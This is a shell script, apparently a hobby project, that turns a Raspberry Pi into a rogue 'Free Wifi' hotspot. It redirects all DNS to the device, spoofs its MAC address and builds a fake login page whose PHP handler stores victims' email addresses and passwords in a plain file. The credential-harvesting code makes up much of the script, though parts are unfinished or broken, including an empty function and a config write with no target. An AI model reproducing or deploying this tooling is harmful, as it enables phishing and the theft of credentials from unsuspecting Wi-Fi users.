#!/bin/sh

# This program was written by Jason Sholler

# Please use responsibly, I am not liable for any damages caused

# Functions that define the core of the program

welcome_message()
{
	# Welcome the user with a whiptail box
	whiptail --title "Pi Wifi Pineapple" --msgbox "This script automatically sets up the Raspberry Pi to be an evil hotspot.\\n\nThis means people can connect to it and you can see them connecting." 12 60
}

preinstall_message()
{
	# Final installation message before installing
	whiptail --yesno "This is the last prompt before installation begins. Continue?" 10 30
}

begin_installation()
{
	_install=apt-get install hostapd dnsmasq php7.0
	{
		$_install
		id="0"
		while (true)
		do
			proc=$(ps aux | grep -v grep | grep -e "apt")
			if [[ "$proc" == "" ]]; then break; fi
		sleep 1
		echo $i
		i=$(expr $i + 1)
		done
		echo 100
		sleep 1
	} | whiptail --title "Installing" --gauge "Installing all dependencies" 8 60 0
}

error_screen()
{
	clear;
	echo "Exiting installation"
}

make_hostapd_conf()
{
	# Create the hostapd.conf file - This sets the wifi interface to broadcast an SSID
	printf "interface=wlan0\nssid=Free Wifi\nchannel=1" >> /etc/hostapd/hostapd.conf
}

change_initd_hostapd()
{
	# Edit the /etc/init.d/hostapd file with line "DAEMON_CONF=/etc/hostapd/hostapd.conf" using sed
	sed -i 's/^\(DAEMON\_CONF=\).*$/\1\/etc\/hostapd\/hostapd\.conf/' /etc/init.d/hostapd
}

change_default_hostapd()
{
	# TODO: Edit the /etc/default/hostapd file with line 'DAEMON_OPTS="-t -d -K -f /var/log/hostapd.log"
	mv /etc/default/hostapd /etc/default/hostapd.bak
	printf 'DAEMON_OPTS="-t -d -K -f /var/log/hostapd.log"' >> /etc/default/hostapd
}

change_dnsmasq_conf()
{
	# Move the file for backup
	mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak

	# Create the new configuration file for dnsmasq
	printf "address=/#/10.0.0.1\ninterface=wlan0\ndhcp-range=wlan0,10.0.0.2,10.0.0.254,12h"
}

change_dhcpcd_conf()
{
	# Edit /etc/dhcpcd.conf to set a static IP Address on wlan0
	printf "interface wlan0\nstatic ip_address=10.0.0.1/24\nstatic domain_name_servers=127.0.0.1" >> /etc/dhcpcd.conf
}

update_rcd()
{
	update-rc.d apache2 defaults
	update-rc.d hostapd defaults
	update-rc.d dnsmasq defaults
}

change_mac()
{
	echo "sudo ifconfig wlan0 hw ether 02:ab:cd:ef:12:30" >> /home/pi/.bashrc;
}

# TODO: Fix this to automatically output an SSL key for Apache2
setup_apache2()
{
	mkdir /etc/apache2/ssl;
	openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/server.crt -keyout /etc/apache2/ssl/server.key
	a2enmod ssl
	ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/000-default-ssl.conf
}

# TODO: Edit config file to point to the SSL Keys
edit_apache2_conf()
{
}

edit_html()
{
	chmod 777 /var/www/html
	rm /var/www/html/index.html
}

create_landing_page()
{
	printf '<body>\n<form action="submit.php" method="post">\nEmail Address:<br>\n<input type="text" name="uname">\n<br>\nPassword:<br>\n<input type="password" name="password">\n<br><br>\n<input type="submit" value="Submit">\n</form>\n</body>\n</html>' >> /var/www/html/index.php
	printf '<?php\n$filename =  "/var/www/html/passwords";\n$current = file_get_contents($filename);\n $current .= $_POST["uname"].",".$_POST["password"]."\n";\nfile_put_contents($filename, $current);\n?>\n<h2>Success, You have logged in. You can now use the free internet!</h2>' >> /var/www/html/submit.php
}

# Start of the main script

# Check if root
if [ "$(whoami)" != "root" ]; then
        whiptail --msgbox "Sorry you are not root. You must type: sudo bash piwifipineapple.sh" 10 40 1
        exit
fi

welcome_message

if (preinstall_message -eq 0); then
	begin_installation
else
	exit 1
fi

make_hostapd_conf
# TODO: edit /etc/default/hostapd to add logging
change_dhcpcd_conf
change_dnsmasq_conf
update_rcd
